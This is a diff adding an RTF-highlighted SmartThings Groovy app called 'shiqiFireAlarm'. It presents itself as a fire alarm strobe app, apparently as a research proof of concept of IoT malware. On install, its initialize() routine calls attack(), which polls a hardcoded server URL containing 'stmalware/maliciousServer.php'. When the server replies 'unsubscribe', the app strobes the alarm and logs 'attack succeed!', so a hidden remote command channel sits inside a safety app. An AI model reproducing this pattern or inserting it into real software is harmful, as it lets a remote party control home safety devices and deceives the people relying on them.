@@ -1,0 +1,97 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red64\green128\blue128;\red186\green33\blue33;\red153\green153\blue153;\red25\green23\blue124;\red0\green0\blue255;\red128\green0\blue128;\red187\green187\blue187;\red102\green102\blue102;\red136\green136\blue136;\red0\green128\blue0;\red170\green34\blue255;\red187\green102\blue34;\red187\green102\blue136;\red255\green0\blue0;\red0\green68\blue221;\red188\green122\blue0;\red0\green160\blue0;\red210\green65\blue58;\red0\green0\blue128;\red176\green0\blue64;\red125\green144\blue41;\red160\green0\blue0;\red136\green0\blue0;\red160\green160\blue0;}\f0{\cf1\i /**\par
+ *  shiqiFireAlarm\par
+ *\par
+ *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang\par
+ *\par
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except\par
+ *  in compliance with the License. You may obtain a copy of the License at:\par
+ *\par
+ *      http://www.apache.org/licenses/LICENSE-2.0\par
+ *\par
+ *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed\par
+ *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License\par
+ *  for the specific language governing permissions and limitations under the License.\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+    {\cf24 name:} {\cf2 "shiqiFireAlarm"}{\cf8 ,}\par
+    {\cf24 namespace:} {\cf2 "wsq"}{\cf8 ,}\par
+    {\cf24 author:} {\cf2 "Yunhan Jia & Shiqi Wang"}{\cf8 ,}\par
+    {\cf24 description:} {\cf2 "This app could strobe the alarm when there is a fire in home"}{\cf8 ,}\par
+    {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+    {\cf24 iconUrl:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png"}{\cf8 ,}\par
+    {\cf24 iconX2Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 ,}\par
+    {\cf24 iconX3Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 )}\par
+\par
+\par
+preferences {\cf8 \{}\par
+  section{\cf8 (}{\cf2 "Title"}{\cf8 )} {\cf8 \{}\par
+    input {\cf2 "smoke"}{\cf8 ,} {\cf2 "capability.smokeDetector"}{\cf8 ,} {\cf24 title:} {\cf2 "smoke"}\par
+    input {\cf2 "alarm"}{\cf8 ,} {\cf2 "capability.alarm"}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 installed}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Installed with settings: $\{settings\}"}\par
+  initialize{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 updated}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Updated with settings: $\{settings\}"}\par
+\par
+  unsubscribe{\cf8 (}{\cf8 )}\par
+  initialize{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 initialize}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  state{\cf8 .}{\cf21 attack} {\cf8 =} {\cf10\b false}\par
+  subscribe{\cf8 (}smoke{\cf8 ,} {\cf2 "smoke"}{\cf8 ,} smokeHandler{\cf8 )}\par
+  subscribe{\cf8 (}alarm{\cf8 ,} {\cf2 "alarm"}{\cf8 ,} strobeHandler{\cf8 )}\par
+    {\cf1\i //runEvery1Hour(attack)\par
+}    attack{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 smokeHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if}{\cf8 (}{\cf2 "detected"} {\cf8 =}{\cf8 =} evt{\cf8 .}{\cf21 value}{\cf8 )} {\cf8 \{}\par
+    alarm{\cf8 .}{\cf21 strobe}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+  {\cf10\b if}{\cf8 (}{\cf2 "clear"} {\cf8 =}{\cf8 =} evt{\cf8 .}{\cf21 value}{\cf8 )} {\cf8 \{}\par
+    alarm{\cf8 .}{\cf21 off}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 strobeHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "strobe"}{\cf8 )} {\cf8 \{}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "smoke strobe the alarm"}\par
+    {\cf8 \}}\par
+  {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "off"}{\cf8 )} {\cf8 \{}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "clear, turn off the alarm"}\par
+    {\cf8 \}}\par
+    {\cf1\i //attack()\par
+}{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 attack}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf10\b try}{\cf8 \{}\par
+        httpGet{\cf8 (}{\cf2 "http://141.212.110.244/stmalware/maliciousServer.php"}{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+\par
+    {\cf10\b if}{\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )}\par
+    {\cf8 \{}\par
+      state{\cf8 .}{\cf21 attack} {\cf8 =} resp{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+            {\cf1\i //log.debug state.attack\par
+}    {\cf8 \}}\par
+    {\cf10\b else}\par
+    {\cf8 \{}\par
+      log{\cf8 .}{\cf21 error} {\cf2 "unknown response"}\par
+    {\cf8 \}}\par
+\par
+  {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b catch} {\cf8 (}e{\cf8 )}{\cf8 \{}\par
+        log{\cf8 .}{\cf21 debug} e\par
+    {\cf8 \}}\par
+    {\cf10\b if}{\cf8 (}state{\cf8 .}{\cf21 attack} {\cf8 =}{\cf8 =} {\cf2 "unsubscribe"}{\cf8 )} {\cf8 \{}\par
+      alarm{\cf8 .}{\cf21 strobe}{\cf8 (}{\cf8 )}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "attack succeed!"}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+}
